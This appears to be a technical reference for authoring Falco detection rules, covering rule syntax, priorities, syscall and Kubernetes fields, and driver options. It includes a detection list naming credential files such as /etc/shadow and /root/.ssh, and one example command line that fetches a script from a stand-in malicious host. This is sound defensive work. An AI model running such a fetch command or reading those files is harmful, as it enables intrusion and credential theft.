# Falco Rules Engine & Grammar Architecture

This document provides a technical reference for authoring, evaluating, and extending rules within the Falco detection engine.

---

## 1. Declarative Structure

A valid Falco rules YAML file contains a list of top-level documents:

```yaml
# 1. Lists
- list: sensitive_files
  items: [/etc/shadow, /etc/sudoers, /etc/pam.d, /root/.ssh]

# 2. Macros
- macro: open_read
  condition: (evt.type in (open, openat, openat2) and evt.is_open_read = true)

# 3. Rules
- rule: Sensitive File Read Access
  desc: Alerts when an untrusted process reads security-critical files
  condition: open_read and fd.name in (sensitive_files) and not proc.name in (trusted_auth_binaries)
  output: Sensitive file opened for reading (file=%fd.name proc=%proc.name user=%user.name pod=%k8s.pod.name)
  priority: WARNING
  tags: [mitre_credential_access, T1552, filesystem]
```

---

## 2. Priority Hierarchy

Falco enforces strict severity classification:

| Priority | Intended Use Case |
|---|---|
| `EMERGENCY` | Critical system compromise or ransomware payload execution in progress. |
| `ALERT` | Imminent threat, active reverse shell, or privilege escalation escape. |
| `CRITICAL` | Severe violation: root container breakout, unauthorized kernel module loaded. |
| `ERROR` | Suspicious binary execution in production container, sensitive directory modification. |
| `WARNING` | Shell spawned in container, unexpected outbound connection, SA token access. |
| `NOTICE` | Unexpected configuration read, developer debugging tool launched. |
| `INFO` | Informational audit events, healthy container lifecycle changes. |
| `DEBUG` | Verbose troubleshooting events. |

---

## 3. Syscall Fields & Filter Operators

### Process Context Fields
- `proc.name`: Basename of the executing process (e.g., `bash`, `curl`, `python3`).
- `proc.cmdline`: Full process command line with arguments (e.g., `curl -fsSL http://malicious.io/sh`).
- `proc.pname`: Basename of parent process (e.g., `containerd-shim`, `dockerd`).
- `proc.aname[<N>]`: Ancestor process name at generation $N$.
- `proc.cwd`: Current working directory of the process.

### File Descriptor (I/O) Fields
- `fd.name`: Target path of the open/read/write operation (e.g., `/etc/shadow`).
- `fd.directory`: Directory containing the target file.
- `fd.sip`: Source IP address for network socket events.
- `fd.dip`: Destination IP address for network socket events.
- `fd.sport`: Source port number.
- `fd.dport`: Destination port number.

### Container & Kubernetes Context
- `container.id`: Unique container ID string (or `host`).
- `container.name`: Name assigned to container.
- `container.image.repository`: Container image registry and repository name.
- `k8s.pod.name`: Kubernetes pod name.
- `k8s.ns.name`: Kubernetes namespace.

### Boolean Operators
- `and`, `or`, `not`
- `in`: Membership test against a list or tuple: `proc.name in (bash, sh, zsh)`.
- `startswith`, `endswith`, `contains`, `glob`.
- Regex matching: `pmatch` (POSIX regex).

---

## 4. Modern eBPF vs Kernel Module Drivers

| Characteristic | Modern eBPF (`modern_bpf`) | Kernel Module (`kmod`) | Legacy eBPF (`bpf`) |
|---|---|---|---|
| **Kernel Requirements** | Linux $\ge 5.8$ with BTF support (`CONFIG_DEBUG_INFO_BTF=y`) | Linux $\ge 3.16$ (Requires kernel headers matching exact kernel version) | Linux $\ge 4.14$ (Requires LLVM/Clang compilation on host) |
| **Stability & Safety** | Verified by Linux in-kernel eBPF verifier (zero kernel panic risk) | Runs in ring 0 kernel space; bug can panic node | Verified by older eBPF verifier |
| **Container Portability** | CO-RE (Compile Once - Run Everywhere) enabled via embedded BTF | Fragile across node OS kernel patching | Fragile across kernel header mismatch |
| **Recommendation** | **MANDATORY for modern Kubernetes nodes (Ubuntu 22+, EKS, GKE, AKS)** | Legacy fallback only | Deprecated |
